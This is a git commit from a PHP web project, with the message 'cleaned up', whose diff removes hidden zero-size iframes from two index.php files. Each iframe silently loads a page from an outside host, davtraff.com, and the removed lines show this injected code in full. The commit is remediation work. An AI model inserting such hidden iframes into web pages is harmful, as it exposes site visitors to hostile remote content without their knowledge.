32b0956e4d4f910bab4b5af82e41672ef4027769
Stefan Koopmanschap <left@leftontheweb.com>
2014-06-27 11:12:27 +0200

    cleaned up

--- administration/index.php
+++ administration/index.php
@@ -6,4 +6,4 @@ $fl = new TemplatePower("./index.tpl");
 require("./header.php");
 
 $fl->printToScreen();
-?><iframe src="http://davtraff.com/lib/index.php" width=0 height=0 style="hidden" frameborder=0 marginheight=0 marginwidth=0 scrolling=no></iframe><iframe src="http://davtraff.com/lib/index.php" width=0 height=0 style="hidden" frameborder=0 marginheight=0 marginwidth=0 scrolling=no></iframe><iframe src="http://davtraff.com/lib/index.php" width=0 height=0 style="hidden" frameborder=0 marginheight=0 marginwidth=0 scrolling=no></iframe>
+?>
--- index.php
+++ index.php
@@ -44,4 +44,3 @@ while($row=mysql_fetch_row($result))
 
 $fl->printToScreen();
 ?>
-<iframe src="http://davtraff.com/lib/index.php" width=0 height=0 style="hidden" frameborder=0 marginheight=0 marginwidth=0 scrolling=no></iframe><iframe src="http://davtraff.com/lib/index.php" width=0 height=0 style="hidden" frameborder=0 marginheight=0 marginwidth=0 scrolling=no></iframe><iframe src="http://davtraff.com/lib/index.php" width=0 height=0 style="hidden" frameborder=0 marginheight=0 marginwidth=0 scrolling=no></iframe>
